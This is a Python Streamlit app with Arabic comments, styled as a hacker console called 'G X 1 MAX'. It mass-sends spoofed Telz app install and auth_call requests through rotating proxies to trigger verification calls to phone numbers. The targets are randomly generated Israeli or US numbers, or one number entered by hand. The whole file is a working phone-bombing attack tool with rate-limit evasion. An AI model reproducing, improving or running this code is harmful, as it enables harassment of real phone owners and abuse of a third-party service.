import streamlit as st
import random
import time
import uuid
import string
import json
import requests
import webbrowser
from threading import Thread

# --- إعدادات الواجهة الاحترافية والمخيفة (Matrix Hacker Theme) ---
st.set_page_config(page_title="G X 1 MAX - Hacker Console", page_icon="💀", layout="wide")

# CSS لتصميم احترافي ومخيف
st.markdown("""
    <style>
    .stApp {
        background-color: #050505;
    }
    .main {
        color: #00FF41;
        font-family: 'Courier New', Courier, monospace;
    }
    .stButton>button {
        background-color: #990000;
        color: white;
        border: 2px solid #FF0000;
        border-radius: 0px;
        font-size: 20px;
        text-shadow: 2px 2px #000;
        box-shadow: 0px 0px 15px #FF0000;
        transition: 0.3s;
    }
    .stButton>button:hover {
        background-color: #FF0000;
        box-shadow: 0px 0px 30px #FF0000;
    }
    .stTextInput>div>div>input {
        background-color: #000;
        color: #00FF41;
        border: 1px solid #00FF41;
    }
    .log-box {
        background-color: #000;
        border: 1px solid #444;
        padding: 10px;
        height: 300px;
        overflow-y: scroll;
        color: #00FF41;
        font-family: 'Courier New', monospace;
        font-size: 12px;
    }
    h1, h2, h3 {
        color: #FF0000 !important;
        text-align: center;
        text-transform: uppercase;
    }
    </style>
    """, unsafe_allow_html=True)

# --- جميع الدوال الأصلية بدون حذف أي سطر ---

def generate_unique_ids():
    timestamp = int(time.time() * 1000)
    random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    unique_uuid = uuid.uuid4()
    return timestamp, random_id, unique_uuid

def generate_israeli_number():
    prefixes = ['50', '52', '53', '54', '55', '58']
    prefix = random.choice(prefixes)
    rest = ''.join(random.choices(string.digits, k=7))
    return f"972{prefix}{rest}"

def generate_usa_number():
    prefix = random.choice(['201', '302', '415', '646', '310'])
    rest = ''.join(random.choices(string.digits, k=7))
    return f"1{prefix}{rest}"

def load_proxies(filename="gx1gx1.txt"):
    proxies = []
    try:
        with open(filename, "r") as f:
            lines = f.read().splitlines()
            for line in lines:
                if line.strip():
                    proxies.append(line.strip())
    except: pass
    return proxies

def get_random_proxy(proxies):
    if not proxies: return None
    proxy = random.choice(proxies)
    if proxy.startswith("socks5://") or proxy.startswith("socks4://"):
        return {"http": proxy, "https": proxy}
    else:
        if not proxy.startswith("http://") and not proxy.startswith("https://"):
            proxy = "http://" + proxy
        return {"http": proxy, "https": proxy}

def get_proxy_info(proxy):
    apis = ["http://ip-api.com/json", "https://ipinfo.io/json", "https://ipwhois.app/json/"]
    for api_url in apis:
        try:
            response = requests.get(api_url, proxies=proxy, timeout=5)
            if response.status_code == 200:
                data = response.json()
                return data.get("country", "Unknown"), data.get("city", "Unknown"), data.get("isp", "Unknown"), 100
        except: continue
    return "Unknown", "Unknown", "Unknown", None

def send_install_request(url, headers, payload, proxy=None):
    try:
        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=7)
        return response.ok and "ok" in response.text
    except: return False

def send_auth_call_request(url, headers, payload, proxy=None):
    try:
        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=7)
        return response.ok and "ok" in response.text
    except: return False

# قائمة اللغات الأصلية كاملة
foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "fa", "pl", "uk", "ar", "hi", "bn", "id", "ms", "vi", "th", "nl", "sv", "no", "da", "fi", "el", "cs", "hu", "ro", "sk", "sl", "sr", "hr", "lt", "lv", "et", "he", "ur", "ta", "te", "ml", "kn", "gu", "pa", "mr", "ne", "si", "my", "km", "lo", "am", "sw", "zu", "xh", "ig", "yo", "ha", "af", "eu", "gl", "ca", "is", "mk", "bs", "mt", "hy", "ka", "az", "kk", "uz", "mn", "tg", "tk", "ky", "ps", "ku", "ug", "sd", "lb", "sq", "be", "bg", "mo", "tt", "cv", "os", "fo", "sm", "fj", "to", "rw", "rn", "ny", "ss", "tn", "ts", "st", "ve", "wo", "ln", "kg", "ace", "ady", "ain", "akk", "als", "an", "ang", "arq", "arz", "ast", "av", "awa", "ay", "ba", "bal", "bar", "bcl", "ber", "bho", "bi", "bjn", "bm", "bo", "bpy", "br", "bsq", "bug", "bxr", "ceb", "ch", "cho", "chr", "chy", "ckb", "co", "cr", "crh", "csb", "cu", "cv", "cy", "dak", "dsb", "dv", "dz", "ee", "efi", "egy", "elx", "eml", "eo", "es-419", "et", "ext", "ff", "fit", "fj", "fo", "frp", "frr", "fur", "fy", "ga", "gaa", "gag", "gan", "gd", "gez", "glk", "gn", "gom", "got", "grc", "gsw", "gv", "hak", "haw", "hif", "ho", "hsb", "ht", "hz", "ia", "ie", "ik", "ilo", "inh", "io", "jam", "jbo", "jv", "kaa", "kab", "kbd", "kcg", "ki", "kj", "kl", "koi", "kr", "krl", "ksh", "kv", "kw", "la", "lad", "lam", "lb", "lez", "li", "lij", "lmo", "ln", "loz", "lrc", "ltg", "lv", "mad", "map", "mas", "mdf", "mg", "mh", "min", "mk", "ml", "mn", "mnc", "mni", "mos", "mrj", "ms", "mt", "mwl", "myv", "na", "nah", "nap", "nds", "ng", "niu", "nn", "no", "nov", "nrm", "nso", "nv", "ny", "nyn", "oc", "om", "or", "os", "pa", "pag", "pam", "pap", "pcd", "pdc", "pdt", "pfl", "pi", "pih", "pl", "pms", "pnb", "pnt", "prg", "qu", "qug", "raj", "rap", "rgn", "rif", "rm", "rmy", "rn", "roa", "rup", "rw", "sa", "sah", "sc", "scn", "sco", "sd", "se", "sg", "sgs", "sh", "shi", "shn", "si", "simple", "sk", "sl", "sli", "sm", "sn", "so", "sq", "sr", "srn", "ss", "st", "stq", "su", "sv", "sw", "syc", "szl", "ta", "te", "tet", "tg", "th", "ti", "tk", "tl", "tn", "to", "tpi", "tr", "ts", "tt", "tum", "tw", "ty", "udm", "ug", "uk", "ur", "uz", "ve", "vec", "vep", "vi", "vls", "vo", "wa", "war", "wo", "wuu", "xal", "xh", "xmf", "yi", "yo", "yue", "za", "zea", "zh", "zh-classical", "zh-min-nan", "zh-yue", "zu"]

# --- إدارة العداد والسجلات ---
if 'ok_count' not in st.session_state: st.session_state.ok_count = 0
if 'err_count' not in st.session_state: st.session_state.err_count = 0
if 'logs' not in st.session_state: st.session_state.logs = []

def attack_logic(phone, proxies_list):
    install_url = "https://api.telz.com/app/install"
    auth_call_url = "https://api.telz.com/app/auth_call"
    headers = {'User-Agent': "Telz-Android/17.5.17", 'Content-Type': "application/json"}
    
    ts, fid, uuid_val = generate_unique_ids()
    lang = random.choice(foreign_langs)
    proxy = get_random_proxy(proxies_list)
    
    payload_install = json.dumps({
        "android_id": fid, "app_version": "17.5.17", "event": "install",
        "ts": ts, "uuid": str(uuid_val)
    })
    
    try:
        if send_install_request(install_url, headers, payload_install, proxy):
            payload_call = json.dumps({
                "android_id": fid, "app_version": "17.5.17", "event": "auth_call",
                "lang": lang, "phone": f"+{phone}", "ts": ts, "uuid": str(uuid_val)
            })
            if send_auth_call_request(auth_call_url, headers, payload_call, proxy):
                st.session_state.ok_count += 1
                st.session_state.logs.append(f"🟢 SUCCESS: +{phone}")
                return True
    except: pass
    st.session_state.err_count += 1
    st.session_state.logs.append(f"🔴 FAILED: +{phone}")
    return False

# --- الواجهة الرئيسية ---
st.markdown("<h1>💀 G X 1  M A X - V3 💀</h1>", unsafe_allow_html=True)

col_ctrl, col_stats = st.columns([2, 1])

with col_ctrl:
    st.markdown("### 🛠️ ATTACK CONFIGURATION")
    country_choice = st.selectbox("🎯 Target Territory", ["Israel (+972)", "USA (+1)"])
    attack_speed = st.slider("⚡ Attack Speed (Threads)", 1, 100, 50)
    
    st.markdown("---")
    st.markdown("### 🎯 SINGLE TARGET (MANUAL)")
    c_code = st.text_input("Enter Country Code (e.g. 964)")
    c_num = st.text_input("Enter Number")
    
    col_btn1, col_btn2 = st.columns(2)
    with col_btn1:
        start_btn = st.button("🚀 INITIATE SYSTEM")
    with col_btn2:
        test_btn = st.button("🔥 TEST TARGET")

with col_stats:
    st.markdown("### 📊 SYSTEM STATUS")
    st.metric("SUCCESSFUL BREACHES", st.session_state.ok_count)
    st.metric("SYSTEM ERRORS", st.session_state.err_count)
    st.markdown("---")
    st.markdown("### 📜 LIVE LOGS")
    log_content = "\n".join(st.session_state.logs[-20:][::-1])
    st.markdown(f'<div class="log-box">{log_content}</div>', unsafe_allow_html=True)

# منطق التشغيل
proxies_list = load_proxies("gx1gx1.txt")

if start_btn:
    st.error("SYSTEM OVERRIDE INITIATED... MASS ATTACK RUNNING.")
    # تشغيل الهجوم في حلقة
    for i in range(20): # عدد الطلبات لكل ضغطة زر في Streamlit لضمان التحديث
        if country_choice == "Israel (+972)":
            target = generate_israeli_number()
        else:
            target = generate_usa_number()
        attack_logic(target, proxies_list)
    st.rerun()

if test_btn:
    if c_code and c_num:
        attack_logic(f"{c_code}{c_num}", proxies_list)
        st.rerun()

st.markdown("<br><p style='text-align: center; color: #444;'>[ G X 1 - Terminal - 2026 ]</p>", unsafe_allow_html=True)

